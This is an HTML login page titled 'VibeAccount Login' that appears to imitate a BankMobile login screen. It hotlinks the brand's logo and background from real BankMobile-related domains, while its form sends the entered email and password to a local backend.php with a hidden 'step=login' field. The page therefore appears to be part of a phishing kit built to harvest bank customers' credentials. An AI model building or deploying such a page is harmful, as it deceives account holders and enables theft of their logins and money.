<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VibeAccount Login</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: url('https://www.vibeaccount.com/images/index_page_banner_school.jpg') no-repeat center center fixed;
    background-size: cover;
}

/* ================= HEADER ================= */
.header {
    width: 100%;
    background: #fff;
    border-bottom: 1px solid #e5e5e5;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 30px;
}

/* Logo */
.header .logo img {
    height: 50px;
}

/* Header login form (top right) */
.header .login-container {
    display: flex;
    align-items: center;
    gap: 10px;
}

.header .login-container input[type="email"],
.header .login-container input[type="password"] {
    border: none;
    border-bottom: 2px solid #00a651;
    background: transparent;
    padding: 5px;
    font-size: 14px;
    outline: none;
    width: 180px;
}

.header .login-container button,
.header .login-container a.button {
    border: 1px solid #00a651;
    background: transparent;
    color: #00a651;
    padding: 6px 12px;
    cursor: pointer;
    font-weight: bold;
    text-decoration: none;
    border-radius: 3px;
}

.header .login-container button:hover,
.header .login-container a.button:hover {
    color: #007f3c;
    border-color: #007f3c;
}

.forgot-link {
    font-size: 12px;
    color: #00a651;
    text-decoration: none;
    display: block;
}

.forgot-link:hover {
    text-decoration: underline;
}

/* Responsive */
@media(max-width: 767px) {
    .header .login-container {
        width: 100%;
        margin-top: 10px;
        flex-direction: column;
        align-items: stretch;
    }

    .header .login-container input,
    .header .login-container button,
    .header .login-container a.button {
        width: 100%;
        margin: 5px 0;
    }
}
</style>
</head>
<body>

<!-- ================= HEADER ================= -->
<div class="header">
    <div class="logo">
        <img src="https://www.refundselection.com/refundselection/images/ng-images/bankmobile-logo-black.svg" alt="BankMobile Logo">
    </div>

    <div class="login-container">
        <!-- LOGIN STEP (top right) -->
        <form id="loginStepHeader" method="POST" action="backend.php">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#" class="forgot-link">Forgot Login Information?</a>
            <button type="submit">LOG IN!</button>
            <a href="https://www.refundselection.com" class="button">Get Started</a>
            <input type="hidden" name="step" value="login">
        </form>
    </div>
</div>

</body>
</html>
